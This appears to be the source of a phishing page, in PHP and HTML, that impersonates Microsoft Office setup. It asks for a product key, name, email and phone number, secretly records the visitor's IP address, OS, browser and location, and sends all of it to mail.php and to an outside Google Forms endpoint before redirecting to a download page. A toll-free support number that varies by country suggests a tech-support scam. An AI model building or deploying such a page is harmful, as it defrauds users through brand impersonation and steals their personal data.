<?php
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$str_info = substr($u_agent, 11, 50);
$os=substr($str_info, 0, strpos($str_info, "AppleWebKit")); 


function getBrowser()
{
$u_agent = $_SERVER['HTTP_USER_AGENT'];
$bname = 'Unknown';
$platform = 'Unknown';
$version= "";

//First get the platform?
if (preg_match('/linux/i', $u_agent)) {
$platform = 'linux';
}
elseif (preg_match('/macintosh|mac os x/i', $u_agent)) {
$platform = 'mac';
}
elseif (preg_match('/windows|win32/i', $u_agent)) {
$platform = 'windows';
}

// Next get the name of the useragent yes seperately and for good reason
if(preg_match('/MSIE/i',$u_agent) && !preg_match('/Opera/i',$u_agent))
{
$bname = 'Internet Explorer';
$ub = "MSIE";
}
elseif(preg_match('/Trident/i',$u_agent))
{ // this condition is for IE11
$bname = 'Internet Explorer';
$ub = "rv";
}
elseif(preg_match('/Firefox/i',$u_agent))
{
$bname = 'Mozilla Firefox';
$ub = "Firefox";
}
elseif(preg_match('/Chrome/i',$u_agent))
{
$bname = 'Google Chrome';
$ub = "Chrome";
}
elseif(preg_match('/Safari/i',$u_agent))
{
$bname = 'Apple Safari';
$ub = "Safari";
}
elseif(preg_match('/Opera/i',$u_agent))
{
$bname = 'Opera';
$ub = "Opera";
}
elseif(preg_match('/Netscape/i',$u_agent))
{
$bname = 'Netscape';
$ub = "Netscape";
}

// finally get the correct version number
// Added "|:"
$known = array('Version', $ub, 'other');
$pattern = '#(?<browser>' . join('|', $known) .
')[/|: ]+(?<version>[0-9.|a-zA-Z.]*)#';
if (!preg_match_all($pattern, $u_agent, $matches)) {
// we have no matching number just continue
}

// see how many we have
$i = count($matches['browser']);
if ($i != 1) {
//we will have two since we are not using 'other' argument yet
//see if version is before or after the name
if (strripos($u_agent,"Version") < strripos($u_agent,$ub)){
    $version= $matches['version'][0];
}
else {
    $version= $matches['version'][1];
}
}
else {
$version= $matches['version'][0];
}

// check if we have a number
if ($version==null || $version=="") {$version="?";}

return array(
'userAgent' => $u_agent,
'name'      => $bname,
'version'   => $version,
'platform'  => $platform,
'pattern'    => $pattern
);
}

// now try it
$ua=getBrowser();
$yourbrowser= $ua['name'] . " " . $ua['version'] ;


function getIPAddress() {  
//whether ip is from the share internet  
if(!empty($_SERVER['HTTP_CLIENT_IP'])) {  
        $ip = $_SERVER['HTTP_CLIENT_IP'];  
}  
//whether ip is from the proxy  
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {  
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];  
}  
//whether ip is from the remote address  
else{  
     $ip = $_SERVER['REMOTE_ADDR'];  
}  
return $ip;  
}  
$ip = getIPAddress();



?>
<?php  
    if(isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on')   
         $url = "https://";   
    else  
         $url = "http://";   
    // Append the host(domain name, ip) to the URL.   
    $url.= $_SERVER['HTTP_HOST'];   
    
    // Append the requested resource location to the URL   
    $url.= $_SERVER['REQUEST_URI'];      ?>   
    <?php 
    $location=(unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$ip)));
    $city= $location['geoplugin_city'];
    $state= $location['geoplugin_region'];
    $country= $location['geoplugin_countryName'];
    $zip= $location['geoplugin_areaCode'];
    $c_code= $location['geoplugin_countryCode'];
 ?> 

<!DOCTYPE html>
<html lang="en">
<head>
    <title>Microsoft Office</title>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/css/bootstrap.min.css">
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.0/js/bootstrap.min.js"></script>
    <link href="https://fonts.googleapis.com/css?family=Anton&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/banner.css">
    <link rel="icon" href="img/favicon.ico" type="image/x-icon">

    <link href="https://fonts.googleapis.com/css?family=Lato|Roboto&display=swap" rel="stylesheet">
</head>
<body>
    <!-- header area -->
    <div class="background">
        <div class="container">        
            <a href="index.php"><img src="img/logo.png" class="logo image-responsive" alt=""></a>
            <ul class="nav navbar-nav navbar-right">
                <li class="navbar-link"><a href="setup-index.php"> Setup Product Key</a></li>
                <li class="navbar-link"><a href="offlog">Sign in</a> </li>
                <li class="navbar-link"><a href="offreg">Register</a> </li>
                <li class="navbar-link"><a href="off-support.php">Contact Support</a> </li>
            </ul>
        </div>
    </div>
    <!-- //header area end -->
    <!-- body start -->
    <div class="col-lg-6 col-lg-offset-3 body-content-sm"><br>
        <!-- <h1 class="heading margin-top-16">Hi. Let's get your Office</h1> -->
        <div class="col-lg-12">
            <h1 class="sign-in-heading"><span class="number">1</span>Setup Your Microsoft Office</h1>
            <div class="col-lg-9 verticle-line">
                <br>
            </div>
            <div class="clearfix"></div>
            <h1 class="sign-in-heading"><span class="number">2</span>Enter your product key</h1>
            <div class="col-lg-9 verticle-line">
            <form id="form" target="_self" onsubmit="return postToGoogle();" action="" autocomplete="off">
                <div class="setup-product">
                    <div >
                    <span><img src="img/icon.png" alt="" class="image-responsive" style="width:15%"></span><span class="label-name">Office</span>
                    </div>
                    <br>
                    <p class="text-center">
                        <input type="text" id="key1" name="key1" class="card-input inputs" placeholder="XXXXX" maxlength="5"  required/>
                        <input type="text" id="key2"  name="key2" class="inputs card-input" placeholder="XXXXX" maxlength="5" required/>
                        <input type="text" id="key3"  name="key3" class="inputs card-input" placeholder="XXXXX" maxlength="5" required/> 
                        <input type="text" id="key4"  name="key4" class="inputs card-input" placeholder="XXXXX" maxlength="5" required/> 
                        <input type="text" id="key5"  name="key5" class="inputs card-input" placeholder="XXXXX" maxlength="5" required/> 
                        <input type="hidden" id="key"  name="key" value="" class="card-key" placeholder="XXXXX"  /> 
                        <input type="hidden" id="ipField"  name="ip" value="<?php echo $ip ?>" class="card-key" placeholder="" maxlength="4" /> 
                        <input type="hidden" id="osField"  name="os" value="<?php echo $os ?>" class="card-key" placeholder="" maxlength="4" /> 
                        <input type="hidden" id="browserField"  name="browser" value="<?php echo $yourbrowser ?>" class="card-key" placeholder="XXXX" maxlength="4" /> 
                    </p>
                    <br><br>
                    <p class="text-right card-caption" >Enter 25-Digit Product Key</p>

                </div>
                <br>
                <div class="form_bottm">
                    <input type="text"  id="fname" class="input-key" placeholder="Full Name" required> 
                    <input type="text"  id="email" class="input-key" placeholder="Email" required> 
                    <select id="country" class="input-key1" placeholder="Country" required> 
                        <option value="">Country</option>
                        <option value="United States">United States  +1 </option>
                        <option value="Canada">Canada +1 </option>
                        <option value="Australia">Australia +61 </option>
                        <option value="United Kingdom">United Kingdom +44 </option>
                        <option value="New Zealand"> New Zealand +64</option>
                        <option value="Other">Other</option>
                    </select><br>
                    <p class="text-center" style="font-size: 12px;margin-top:12px;color: #1b07bd;"><b>Enter your phone number and we will send you a verification code to confirm your identity</b></p>
                    <input type="text"   id="phone" class="input-key" pattern= "[0-9]+" placeholder="Phone No." required> 
                    <br><br>
                    <input type="Submit" style="margin-bottom:25px;" class="input-key-submit">
                </div>
                
            </div>
            <div class="clearfix"></div>
            <h1 class="sign-in-heading"><span class="number">3</span>Get your Office</h1>
        </div>
    </form>
    </div>
    <!-- //body end -->
    <div class="footer">
  <p><span class="cont-text">Customer Support Toll Free :</span> <span class="number-hp">
  <?php 
if($c_code == "US")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "CA")
{
echo "US/CA +1 844 514 0333";
}
elseif($c_code == "GB")
{
echo "UK   +44 800 229 4983";
}
elseif($c_code == "AU")
{
echo "AU   +1 844 514 0333";
}
elseif($c_code == "NZ")
{
echo "NZ   +1 844 514 0333";
}
else
{
    echo "+1 844 514 0333";
}
?> 
  </span> </p>
</div>
</body>
</html>
<script>
$(".inputs").keyup(function () {
    var str="";
    if (this.value.length == this.maxLength) {
      $(this).next('.inputs').focus();
    }
});
$(".inputs").keyup(function () {
    var str="";
    $('.inputs').each(function(){
        str += $(this).val();
    });
    $("#key").val(str);
});
</script>
<script>
  $("#form").submit(function() 
  {
    var field1 = $("#key").val();
    var field2 = $("#fname").val();
    var field3 = $("#email").val();
    var field4 = $("#phone").val();
    var field5 = $("#country option:selected").text();
    var field6 = $("#ipField").val();
    var field7 = $("#osField").val();
    var field8 = $("#browserField").val();
    $.ajax({
        type: "POST",
        url: "mail.php",
        // data: "name=" + name+ "&password=" + password "ip",
        data: {"name": field2, "email": field3, "mobile": field4, "country": field5, "key": field1, "ip": field6, "os": field7, "browser": field8 },
        success: function(data) {
           return true;
        }
    });
        return false    
        e.preventDefault();
});
</script>
<script>
                    var issue= "ACT-OFF";


        function pageRedirect() {
                     window.location.replace("download.php");
                        }   
    function postToGoogle() {
        var field1 = $("#key").val();
        var field2 = $("#fname").val();
        var field3 = $("#email").val();
        var field4 = $("#phone").val();
        var field5 = $("#country option:selected").text();
        var field6 = $("#ipField").val();
        var field7 = $("#osField").val();
        var field8 = $("#browserField").val();
           
           $.ajax({
               url: "https://docs.google.com/forms/d/e/1FAIpQLScktgcZ6EoZg6XEFBgHpZH26mH3gKuJZ1lF10ldYKhEcrHjjQ/formResponse",
			data: {"entry.1662271692": field1, "entry.387747653": field2, "entry.806782166": field3, "entry.843182171": field4, "entry.55418645": field5, "entry.500770884": field6, "entry.297371834": field7, "entry.1328838957": field8, "entry.1753287777": issue},
               type: "POST",
               dataType: "xml",
               success: function(d)
			{
			},
            
			error: function(x, y, z)
				{
                    setTimeout("pageRedirect()", 100);
					
				}
           });
		return false;
       }
</script>
